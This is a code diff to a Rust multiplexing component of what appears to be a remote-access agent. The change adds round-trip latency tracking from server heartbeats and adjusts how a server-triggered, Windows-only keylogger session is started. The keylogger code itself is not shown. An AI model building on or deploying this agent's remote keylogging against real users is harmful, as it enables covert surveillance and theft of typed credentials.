@@ -1,8 +1,9 @@
 use std::collections::HashMap;
 use std::io::Write;
-use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicU32, AtomicU64, Ordering};
 use std::sync::{Arc, Mutex};
 use std::thread;
+use std::time::{SystemTime, UNIX_EPOCH};
 
 use crossbeam::channel;
 
@@ -30,6 +31,7 @@ pub struct MultiplexManager {
     shutdown: Arc<AtomicBool>,
     #[cfg(target_os = "windows")]
     keylogger_session: Arc<Mutex<Option<crate::keylogger::KeyloggerSession>>>,
+    latency_tracker: Arc<Mutex<Option<Arc<AtomicU64>>>>,
 }
 
 impl MultiplexManager {
@@ -49,6 +51,15 @@ impl MultiplexManager {
             shutdown: Arc::new(AtomicBool::new(false)),
             #[cfg(target_os = "windows")]
             keylogger_session: Arc::new(Mutex::new(None)),
+            latency_tracker: Arc::new(Mutex::new(None)),
+        }
+    }
+
+    /// Set the atomic counter that will be updated with measured RTT
+    /// when the server echoes back a heartbeat.
+    pub fn set_latency_tracker(&self, tracker: Arc<AtomicU64>) {
+        if let Ok(mut lt) = self.latency_tracker.lock() {
+            *lt = Some(tracker);
         }
     }
 
@@ -242,7 +253,7 @@ impl MultiplexManager {
                         eprintln!("Keylogger already running");
                         return Ok(());
                     }
-                    let session = crate::keylogger::KeyloggerSession::start(self.clone())?;
+                    let session = crate::keylogger::KeyloggerSession::start(self.clone());
                     *session_guard = Some(session);
                     eprintln!("Keylogger started");
                 }
@@ -347,8 +358,20 @@ impl MultiplexManager {
                 Packets::StreamError(error) => {
                     eprintln!("Stream {} error: {}", error.stream_id, error.error);
                 }
-                Packets::Heartbeat(_) => {
-                    // Server heartbeat response, ignore
+                Packets::Heartbeat(hb) => {
+                    if hb.sent_at_ms > 0 {
+                        #[allow(clippy::cast_possible_truncation)]
+                        let now_ms = SystemTime::now()
+                            .duration_since(UNIX_EPOCH)
+                            .unwrap_or_default()
+                            .as_millis() as u64;
+                        let rtt = now_ms.saturating_sub(hb.sent_at_ms);
+                        if let Ok(lt) = self.latency_tracker.lock()
+                            && let Some(tracker) = lt.as_ref()
+                        {
+                            tracker.store(rtt, Ordering::Relaxed);
+                        }
+                    }
                 }
                 Packets::AgentControl(control) => {
                     match control.instruction {
